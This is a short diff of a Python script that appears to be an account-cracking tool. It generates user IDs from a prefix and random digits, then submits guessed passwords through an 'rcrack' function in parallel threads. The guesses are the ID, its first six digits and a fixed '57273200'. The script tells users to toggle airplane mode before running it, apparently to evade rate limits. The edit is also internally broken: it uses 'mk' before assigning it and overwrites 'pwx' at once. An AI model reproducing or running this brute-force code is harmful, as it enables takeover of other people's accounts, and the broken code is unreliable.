@@ -278,9 +278,9 @@ def random_number():
 		print('\033[1;33;1m[?] CHOICE YUR CONTORY :(\033[1;96mINDIA\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
+			pwx = [mk,'57273200']
 			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,mk,'57273200']
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(47*"-")
 	print('[✓] Crack process has been completed')
